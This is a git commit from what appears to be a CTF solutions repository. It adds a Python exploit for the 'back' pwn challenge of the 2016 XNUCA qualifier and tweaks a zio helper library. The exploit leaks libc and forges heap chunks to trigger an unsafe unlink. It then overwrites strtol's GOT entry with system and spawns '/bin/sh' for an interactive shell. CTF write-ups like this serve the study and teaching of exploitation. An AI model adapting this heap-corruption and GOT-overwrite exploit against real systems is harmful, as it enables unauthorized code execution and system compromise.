cd7342858afbb52a25800e08f8112b729f37f93c
Seas0n <306443228@qq.com>
2016-10-06 01:05:49 +0800

    xnuca-qual-2016-back

---
+++ solutions/ctfs/2016/xnuca-qual-2016/xnuca-qual-2016-back/exp.py
@@ -0,0 +1,77 @@
+#!/usr/bin/env python2.7
+# -*- coding:utf-8 -*-
+from mk import *
+
+# settings
+local   = True
+debug   = False
+
+if local:
+    target  = './back'
+else:
+    target  = ('0', 0)
+
+# get io
+io  = mk(target, debug)
+
+got_strtol      = 0x602048
+offset_puts     = 0x000000000006fe30
+offset_system   = 0x0000000000046640
+
+# leak
+def leak_libc():
+    io.ru('0x')
+    libc_puts   = int(io.r(12), 16)
+    libc_base   = libc_puts - offset_puts
+
+    info_found('libc puts', libc_puts)
+    info_found('libc base', libc_base)
+    info_found('libc system', libc_base + offset_system)
+    return libc_base
+
+# exp
+def exp():
+    libc_base = leak_libc()
+    # malloc chunk 0, 1
+    io.ws([1] * 3)
+
+    fake0  = 'A' * 0x58
+    fake0 += l64(0xa1)
+    io.ws([2, 0])
+    io.w(fake0)
+
+    fake1  = 'A' * 0x60
+    fake1 += l64(0x0)
+    fake1 += l64(0x31)
+    fake1 += l64(0x6020a0 - 0x8 * 3)
+    fake1 += l64(0x6020a0 - 0x8 * 2)
+    io.ws([2, 1])
+    io.w(fake1)
+
+    fake2  = l64(0x30)
+    fake2 += l64(0x50)
+    io.ws([2, 2])
+    io.w(fake2)
+
+    # unlink
+    io.ws([3, 1])
+
+    io.wl(4919)
+    io.ru('hack this...')
+    io.w(l64(got_strtol - 0x18))
+
+    io.wl(4919)
+    io.ru('hack this...')
+    io.w(l64(libc_base + offset_system))
+
+    io.ru('choice')
+    io.wl('/bin/sh')
+
+    info_shell()
+    
+    io.interact()
+
+# main
+if __name__ == '__main__':
+    exp()
+    exit()
--- tool/mkp.py
+++ tool/mkp.py
@@ -4,8 +4,9 @@
 from zio import *
 
 # print
-GREEN   = COLORED(RAW, 'green')
-CYAN    = COLORED(RAW, 'cyan')
+BLUE    = COLORED(RAW, color = 'blue', attrs = ['bold'])
+GREEN   = COLORED(RAW, color = 'green', attrs = ['bold'])
+CYAN    = COLORED(RAW, color = 'cyan', attrs = ['bold'])
 
 # extension for zio
 # write
@@ -24,7 +25,7 @@ def ws(self ,sequence):
     self.writelines( [str(i) if isinstance(i, (int, long)) else i for i in sequence] )
 
 # read
-def r(self, size = None, timeout = 1):
+def r(self, size = None, timeout = -1):
     return self.read(size, timeout)
 
 # readline
@@ -32,7 +33,7 @@ def rl(self, size = 1):
     return self.read_line(size)
 
 # read_until
-def ru(self, pattern_list, timeout = 1, searchwindowsize = None):
+def ru(self, pattern_list, timeout = -1, searchwindowsize = None):
     return self.read_until(pattern_list, timeout, searchwindowsize)
 
 def wa(self, pattern_list, s, timeout = -1, searchwindowsize = None):
@@ -40,14 +41,18 @@ def wa(self, pattern_list, s, timeout = -1, searchwindowsize = None):
     self.writeline(s)
 
 # writeline_after
-def wla(self, pattern_list, s, timeout = 1, searchwindowsize = None):
+def wla(self, pattern_list, s, timeout = -1, searchwindowsize = None):
     self.read_until(pattern_list, timeout, searchwindowsize) 
     self.writeline(s)
 
 # wrtelins_after
-def wsa(self, pattern_list, sequence, timeout = 1, searchwindowsize = None):
+def wsa(self, pattern_list, sequence, timeout = -1, searchwindowsize = None):
     self.read_until(pattern_list, timeout, searchwindowsize) 
     self.writelines( [str(i) if isinstance(i, (int, long)) else i for i in sequence] )
+
+def hint(self, breakpoints = None, relative = None, extras = None):
+    self.gdb_hint(breakpoints, relative, extras)
+
 
 # main
 setattr(zio, 'w', w)
@@ -59,13 +64,17 @@ setattr(zio, 'wsa', wsa)
 setattr(zio, 'r', r)
 setattr(zio, 'rl', rl)
 setattr(zio, 'ru', ru)
+setattr(zio, 'hint', hint)
 
 # utilities
 def info_leak(arg1, arg2):
-    print GREEN("[_] {} => {}".format(arg1, arg2))
+    print BLUE("[_] {} => {}".format(arg1, arg2))
 
 def info_found(arg1, arg2):
-    print CYAN("[+] {} :  {}".format(arg1, arg2))
+    print GREEN("[+] {} :".format(arg1).ljust(0x20, ' ') + "{}".format(hex(arg2)))
+
+def info_shell():
+    print CYAN("\n[~*~] enjoy your shell!")
 
 def mkp(target, debug = True):
     if debug:
@@ -73,4 +82,4 @@ def mkp(target, debug = True):
     else:
         return zio(target, print_read = False, print_write = False, timeout = 10000)
 
-__all__ = ['info_leak', 'info_found', 'mkp']
+__all__ = ['info_shell', 'info_leak', 'info_found', 'mkp', 'stdout', 'log','l8', 'b8', 'l16', 'b16', 'l32', 'b32', 'l64', 'b64', 'zio', 'EOF', 'TIMEOUT', 'SOCKET', 'PROCESS', 'REPR', 'EVAL', 'HEX', 'UNHEX', 'BIN', 'UNBIN', 'RAW', 'NONE', 'COLORED', 'PIPE', 'TTY', 'TTY_RAW', 'cmdline']
